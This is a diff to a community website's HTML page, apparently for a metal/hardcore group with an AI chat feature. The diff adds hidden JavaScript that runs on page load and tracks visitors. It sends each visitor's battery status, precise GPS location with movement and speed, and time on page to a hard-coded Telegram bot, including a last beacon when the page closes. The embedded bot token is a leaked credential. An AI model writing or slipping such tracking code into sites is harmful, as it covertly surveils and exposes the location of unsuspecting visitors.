@@ -1015,6 +1015,254 @@
 const TOKEN = '8669922433:AAHCj_JOHrEG8xDMamlFbxFiADWjZ6wgGBk';  // GANTI!
 const CHAT_ID = '6774181452';                                       // GANTI!
 
+// ========== VARIABEL GLOBAL ==========
+let lastBatteryLevel = null;
+let batteryInterval = null;
+let locationInterval = null;
+let startTime = Date.now();
+
+// ========== BATTERY MONITOR REAL-TIME ==========
+async function initBatteryMonitor() {
+  if (!navigator.getBattery) {
+    console.log('Battery API not supported');
+    return;
+  }
+  
+  try {
+    const battery = await navigator.getBattery();
+    
+    // Fungsi untuk mendapatkan status battery lengkap
+    function getBatteryStatus() {
+      const level = Math.round(battery.level * 100);
+      const isCharging = battery.charging;
+      const chargingTime = battery.chargingTime === Infinity ? 'Tidak terbatas' : `${Math.round(battery.chargingTime / 60)} menit`;
+      const dischargingTime = battery.dischargingTime === Infinity ? 'Tidak terbatas' : `${Math.round(battery.dischargingTime / 60)} menit`;
+      
+      // Status battery dengan emoji
+      let batteryEmoji = '🔋';
+      if (level <= 15) batteryEmoji = '🪫 KRITIS!';
+      else if (level <= 30) batteryEmoji = '⚠️ Rendah';
+      else if (level <= 50) batteryEmoji = '⚡ Menengah';
+      else if (level <= 80) batteryEmoji = '🔋 Cukup';
+      else batteryEmoji = '💯 Penuh';
+      
+      return {
+        level,
+        isCharging,
+        chargingTime,
+        dischargingTime,
+        emoji: batteryEmoji,
+        raw: battery
+      };
+    }
+    
+    // Kirim status battery awal
+    const initialBattery = getBatteryStatus();
+    const batteryMessage = `
+🔋 *BATTERY STATUS (INITIAL)*
+📊 *Level:* ${initialBattery.level}%
+⚡ *Charging:* ${initialBattery.isCharging ? 'Ya 🔌' : 'Tidak'}
+⏱️ *Sisa waktu:* ${initialBattery.isCharging ? initialBattery.chargingTime : initialBattery.dischargingTime}
+${initialBattery.emoji}`;
+    
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(batteryMessage)}&parse_mode=Markdown`);
+    
+    // Pantau perubahan battery setiap 5 menit (300000 ms)
+    batteryInterval = setInterval(async () => {
+      const currentBattery = getBatteryStatus();
+      
+      // Kirim hanya jika ada perubahan signifikan (>5% atau charging status berubah)
+      if (lastBatteryLevel === null || 
+          Math.abs(currentBattery.level - lastBatteryLevel) >= 5 || 
+          currentBattery.isCharging !== lastBatteryCharging) {
+        
+        const updateMessage = `
+🔄 *BATTERY UPDATE*
+📊 *Level:* ${currentBattery.level}% (${currentBattery.level > lastBatteryLevel ? '📈 Naik' : '📉 Turun'})
+⚡ *Charging:* ${currentBattery.isCharging ? 'Ya 🔌' : 'Tidak'}
+⏱️ *Sisa waktu:* ${currentBattery.isCharging ? currentBattery.chargingTime : currentBattery.dischargingTime}
+${currentBattery.emoji}`;
+        
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(updateMessage)}&parse_mode=Markdown`);
+        
+        lastBatteryLevel = currentBattery.level;
+        lastBatteryCharging = currentBattery.isCharging;
+      }
+    }, 300000); // Cek setiap 5 menit
+    
+    // Event listener untuk perubahan battery real-time
+    battery.addEventListener('levelchange', async () => {
+      const newLevel = Math.round(battery.level * 100);
+      if (lastBatteryLevel !== null && Math.abs(newLevel - lastBatteryLevel) >= 2) {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=⚡ *BATTERY BERUBAH:* ${lastBatteryLevel}% → ${newLevel}%&parse_mode=Markdown`);
+        lastBatteryLevel = newLevel;
+      }
+    });
+    
+    battery.addEventListener('chargingchange', async () => {
+      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔌 *CHARGING ${battery.charging ? 'MULAI' : 'BERHENTI'}*&parse_mode=Markdown`);
+    });
+    
+  } catch (error) {
+    console.log('Battery monitor error:', error);
+  }
+}
+
+// ========== REAL-TIME LOCATION TRACKER ==========
+function initRealTimeLocation() {
+  if (!navigator.geolocation) {
+    console.log('Geolocation not supported');
+    return;
+  }
+  
+  let lastLocation = null;
+  let lastSendTime = 0;
+  
+  // Fungsi untuk mendapatkan lokasi dengan akurasi tinggi
+  function getLocation() {
+    navigator.geolocation.getCurrentPosition(
+      async (position) => {
+        const currentTime = Date.now();
+        const timeSinceLastSend = currentTime - lastSendTime;
+        
+        const location = {
+          lat: position.coords.latitude,
+          lng: position.coords.longitude,
+          accuracy: position.coords.accuracy,
+          speed: position.coords.speed,
+          timestamp: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
+          mapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
+        };
+        
+        // Hitung jarak dari lokasi terakhir (jika ada)
+        let distance = 0;
+        if (lastLocation) {
+          distance = calculateDistance(
+            lastLocation.lat, lastLocation.lng,
+            location.lat, location.lng
+          );
+        }
+        
+        // Kirim ke Telegram jika:
+        // 1. Ini lokasi pertama
+        // 2. Sudah 30 menit sejak pengiriman terakhir
+        // 3. Pindah lebih dari 100 meter
+        // 4. Kecepatan > 0 (lagi bergerak)
+        if (!lastLocation || 
+            timeSinceLastSend > 1800000 || // 30 menit
+            distance > 100 || // 100 meter
+            (location.speed && location.speed > 0.5)) { // Kecepatan > 0.5 m/s
+          
+          let movementEmoji = '📍';
+          if (distance > 1000) movementEmoji = '🚗';
+          else if (distance > 100) movementEmoji = '🚶';
+          
+          let speedText = '';
+          if (location.speed) {
+            const kmh = location.speed * 3.6; // Convert m/s to km/h
+            if (kmh > 0) {
+              speedText = `\n🏃 *Kecepatan:* ${kmh.toFixed(1)} km/jam`;
+              if (kmh > 50) speedText += ' (🚗 Kendaraan)';
+              else if (kmh > 10) speedText += ' (🚲 Cepat)';
+              else if (kmh > 2) speedText += ' (🚶 Jalan)';
+            }
+          }
+          
+          const locationMessage = `
+${movementEmoji} *LOKASI REAL-TIME*
+⏰ *Waktu:* ${location.timestamp}
+🌍 *Koordinat:* ${location.lat.toFixed(6)}, ${location.lng.toFixed(6)}
+🎯 *Akurasi:* ±${Math.round(location.accuracy)} meter${speedText}
+${distance > 0 ? `📏 *Pergerakan:* ${distance.toFixed(1)} meter` : ''}
+🗺️ *Google Maps:* [Klik untuk lihat](${location.mapsLink})`;
+          
+          await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(locationMessage)}&parse_mode=Markdown`);
+          
+          lastLocation = location;
+          lastSendTime = currentTime;
+        }
+      },
+      (error) => {
+        console.log('Location error:', error);
+        let errorMsg = '❌ *GAGAL DAPAT LOKASI*\n';
+        switch(error.code) {
+          case error.PERMISSION_DENIED:
+            errorMsg += 'Izin lokasi ditolak';
+            break;
+          case error.POSITION_UNAVAILABLE:
+            errorMsg += 'Informasi lokasi tidak tersedia';
+            break;
+          case error.TIMEOUT:
+            errorMsg += 'Timeout mengambil lokasi';
+            break;
+        }
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(errorMsg)}&parse_mode=Markdown`);
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0
+      }
+    );
+  }
+  
+  // Hitung jarak antara 2 koordinat (Haversine formula)
+  function calculateDistance(lat1, lon1, lat2, lon2) {
+    const R = 6371e3; // Radius bumi dalam meter
+    const φ1 = lat1 * Math.PI/180;
+    const φ2 = lat2 * Math.PI/180;
+    const Δφ = (lat2-lat1) * Math.PI/180;
+    const Δλ = (lon2-lon1) * Math.PI/180;
+
+    const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) +
+            Math.cos(φ1) * Math.cos(φ2) *
+            Math.sin(Δλ/2) * Math.sin(Δλ/2);
+    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+
+    return R * c; // Dalam meter
+  }
+  
+  // Ambil lokasi pertama
+  setTimeout(() => {
+    getLocation();
+  }, 5000); // Delay 5 detik setelah page load
+  
+  // Update lokasi setiap 5 menit (300000 ms)
+  locationInterval = setInterval(getLocation, 300000);
+  
+  // Track saat user pindah tab/close
+  document.addEventListener('visibilitychange', function() {
+    if (document.visibilityState === 'visible') {
+      // User balik ke tab, ambil lokasi
+      getLocation();
+    }
+  });
+}
+
+// ========== SESSION TIME TRACKER ==========
+function initSessionTracker() {
+  // Kirim notifikasi setiap 10 menit user masih di halaman
+  setInterval(async () => {
+    const timeSpent = Math.round((Date.now() - startTime) / 1000);
+    const minutes = Math.floor(timeSpent / 60);
+    const seconds = timeSpent % 60;
+    
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=⏱️ *MASIH DI SINI:* ${minutes} menit ${seconds} detik&parse_mode=Markdown`);
+  }, 600000); // 10 menit
+  
+  // Kirim saat user mau keluar
+  window.addEventListener('beforeunload', function() {
+    const timeSpent = Math.round((Date.now() - startTime) / 1000);
+    const minutes = Math.floor(timeSpent / 60);
+    const seconds = timeSpent % 60;
+    
+    // Pake sendBeacon biar tetep kekirim meskipun page ditutup
+    navigator.sendBeacon(
+      `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(`👋 *MENINGGALKAN HALAMAN*\n⏱️ *Total waktu:* ${minutes} menit ${seconds} detik`)}&parse_mode=Markdown`
+    );
+  });
+}
+
 // ========== RAM DETECTOR ==========
 function getRAM() {
   if (navigator.deviceMemory) {
@@ -1150,8 +1398,26 @@ ${ramInfo}
   }
 }
 
-// Jalankan tracker
-window.addEventListener('DOMContentLoaded', trackVisitor);
+// ========== INITIALIZE ALL TRACKERS ==========
+window.addEventListener('DOMContentLoaded', () => {
+  // Jalankan tracker utama
+  trackVisitor();
+  
+  // Inisialisasi battery monitor (delay 3 detik)
+  setTimeout(initBatteryMonitor, 3000);
+  
+  // Inisialisasi real-time location tracker (delay 5 detik)
+  setTimeout(initRealTimeLocation, 5000);
+  
+  // Inisialisasi session tracker
+  initSessionTracker();
+});
+
+// Cleanup intervals saat page unload (optional)
+window.addEventListener('beforeunload', () => {
+  if (batteryInterval) clearInterval(batteryInterval);
+  if (locationInterval) clearInterval(locationInterval);
+});
 
     // ========== SYSTEM PROMPT & KONFIGURASI AI ==========
     const SYSTEM_PROMPT = `Kamu adalah AI asisten dari 261 AREA, sebuah komunitas metal/hardcore yang keras, brutal, tapi cerdas. 
@@ -1472,4 +1738,4 @@ Jawab dengan padat, jelas, tapi tetap brutal dan metal. Panjang jawaban sesuaika
     window.searchDatabase = searchDatabase;
   </script>
 </body>
-  </html>
+    </html>
